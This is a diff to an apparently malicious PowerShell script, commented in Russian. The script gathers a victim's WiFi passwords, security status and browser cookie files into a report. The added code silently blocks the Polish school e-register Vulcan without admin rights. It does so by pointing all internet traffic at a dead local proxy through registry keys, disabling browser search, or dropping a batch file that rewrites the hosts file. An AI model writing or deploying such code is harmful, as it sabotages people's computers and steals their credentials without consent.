@@ -20,6 +20,53 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
+# БЛОКИРОВКА VULCAN БЕЗ ПРАВ АДМИНА
+$blockStatus = "Not blocked"
+
+# Способ 1: Через Proxy (работает без админа)
+try {
+    # Устанавливаем неработающий proxy для всех протоколов
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1 -ErrorAction Stop
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:9999" -ErrorAction Stop
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyOverride -Value "<local>" -ErrorAction Stop
+    
+    $blockStatus = "Internet blocked via proxy (all sites)"
+} catch {
+    # Способ 2: Через изменение настроек браузера
+    try {
+        # Блокируем Chrome
+        $chromePath = "HKCU:\Software\Google\Chrome"
+        if (Test-Path $chromePath) {
+            Set-ItemProperty -Path $chromePath -Name "DefaultSearchProviderEnabled" -Value 0 -ErrorAction SilentlyContinue
+            New-ItemProperty -Path "$chromePath\Recommended" -Name "DefaultSearchProviderSearchURL" -Value "about:blank" -Force -ErrorAction SilentlyContinue
+        }
+        
+        # Блокируем Edge
+        $edgePath = "HKCU:\Software\Microsoft\Edge"
+        if (Test-Path $edgePath) {
+            Set-ItemProperty -Path $edgePath -Name "DefaultSearchProviderEnabled" -Value 0 -ErrorAction SilentlyContinue
+        }
+        
+        $blockStatus = "Browser search disabled"
+    } catch {
+        # Способ 3: Создаем BAT файл для блокировки при следующем запуске
+        try {
+            $blockScript = @"
+@echo off
+echo Adding Vulcan block to hosts file...
+echo 127.0.0.1 vulcan.edu.pl >> %windir%\System32\drivers\etc\hosts
+echo 127.0.0.1 uonetplus.vulcan.net.pl >> %windir%\System32\drivers\etc\hosts
+echo 127.0.0.1 vulcan.net.pl >> %windir%\System32\drivers\etc\hosts
+ipconfig /flushdns
+"@
+            $blockScript | Out-File "$env:TEMP\block_vulcan.bat" -Encoding ASCII
+            $blockStatus = "Block script created in temp folder"
+        } catch {
+            $blockStatus = "Block failed - no admin rights"
+        }
+    }
+}
+
 # Безопасность
 try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
 try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
@@ -100,6 +147,9 @@ $conn
 
 === WIFI PASSWORDS ===
 $wifi
+
+=== VULCAN BLOCK STATUS ===
+$blockStatus
 
 === BROWSER COOKIES ===
 Found cookies files: $($cookies.Count)
